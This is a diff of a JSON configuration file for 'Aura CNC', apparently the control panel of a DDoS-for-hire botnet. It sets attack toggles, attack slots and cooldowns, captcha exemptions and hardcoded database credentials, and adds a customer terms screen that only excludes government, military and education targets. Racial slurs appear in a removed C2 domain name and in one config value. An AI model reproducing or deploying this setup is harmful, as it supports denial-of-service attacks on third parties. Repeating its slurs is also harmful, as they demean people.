@@ -2,26 +2,47 @@
   "cnc": {
     "note1": "license isn't done yet",
     "license": "YOUR_LICENSE_KEY_HERE",
-    "port": "1337",
-    "ip": "niggar.eu.org",
+    "server_port": "1337",
+    "server_ip_address": "YOUR SERVER IP GOES HERE",
     "note2": "if u use cloudflare to secure the api use port 80",
     "api_port": "80",
     "attacks_enabled": true,
     "global_cooldown": 5,
     "global_slots": 10,
-    "captcha_active": true,
-    "captcha_length": 6,
-    "captcha_charset": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
-    "captcha_bypass": ["root","username"],
-    "theme_colour": "not in use will be avalible soon",
-    "spinner_frames": null,
-    "welcome_message": "**** AURANETWORKS SYSTEM – UNAUTHORIZED ACCESS WILL BE PROSECUTED ****\r\n\r\nAccess to this and use of system are restricted to authorized users and\r\ndesignated purposes. Unauthorized acccess or access attempts to this system,\r\nas well as use of this system for prohibited purposes are a crime. Criminal\r\ntrespass to this system will be prosecuted.\r\n\r\nTo maintain proper system operation and detect/deter unauthorized use, system\r\nadministrators may monitor this system. All user activities may be observed,\r\nrecorded, and/or subject to automated logging.\r\n\r\n * Acceptance and Agreement *\r\nContinuing past this point constitutes attestation of your authorization to\r\naccess this system, agreement that your use of this system falls within the\r\nscope of allowed purposes, and your acceptance of and consent to monitoring,\r\nlogging, and recording of your activities.\r\n\r\n * Disagreement *\r\nIf you do not agree to all of the above, you must immediately disconnect from\r\nthis system.\r\n\r\n © 2025 Auranetworks. All rights reserved."
+    "theme_colour": "NOT-IN-USE-YOU-NIGGA",
+    "spinner_frames": null
   },
-  "mysql": {
-    "note3": "make sure to have the same criticals in the setup.sh file and they need to match the mysql setup",
+
+    "mysql": {
+    "note3": "make sure to create the database and a root user with all privileges",
     "db_user": "AURACNC-USER",
     "db_pass": "AURA-CNC-SECURE-PASS",
     "db_host": "localhost:3306",
     "db_name": "AURACNC"
+  },
+
+  "initial_connection": {
+    "enabled": false,
+    "banner_message": "**** AURANETWORKS SYSTEM – UNAUTHORIZED ACCESS WILL BE PROSECUTED ****\r\n\r\nAccess to this and use of system are restricted to authorized users and\r\ndesignated purposes. Unauthorized acccess or access attempts to this system,\r\nas well as use of this system for prohibited purposes are a crime. Criminal\r\ntrespass to this system will be prosecuted.\r\n\r\nTo maintain proper system operation and detect/deter unauthorized use, system\r\nadministrators may monitor this system. All user activities may be observed,\r\nrecorded, and/or subject to automated logging.\r\n\r\n * Acceptance and Agreement *\r\nContinuing past this point constitutes attestation of your authorization to\r\naccess this system, agreement that your use of this system falls within the\r\nscope of allowed purposes, and your acceptance of and consent to monitoring,\r\nlogging, and recording of your activities.\r\n\r\n * Disagreement *\r\nIf you do not agree to all of the above, you must immediately disconnect from\r\nthis system.\r\n\r\n © 2025 Auranetworks. All rights reserved."
+  },
+
+  "login_captcha": {
+    "enabled": true,
+    "exclude_users": [
+      "root",
+      "admin"
+    ],
+    "length": 6,
+    "charset": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+  },
+
+  "tos_screen": {
+    "enabled": true,
+    "message": "Aura CNC Terms of Service\r\n\r\nNo sharing accounts\r\n\r\nNo sharing API keys\r\n\r\nNo hitting govs, mil or edus\r\n\r\nif we catch you doing any of the above your account will be banned and your API key will be revoked\r\n\r\nDo you accept the terms?",
+    "answer": ["yes", "y", "accept", "agree"],
+    "exclude_users": [
+      "root",
+      "admin"
+    ]
   }
 }
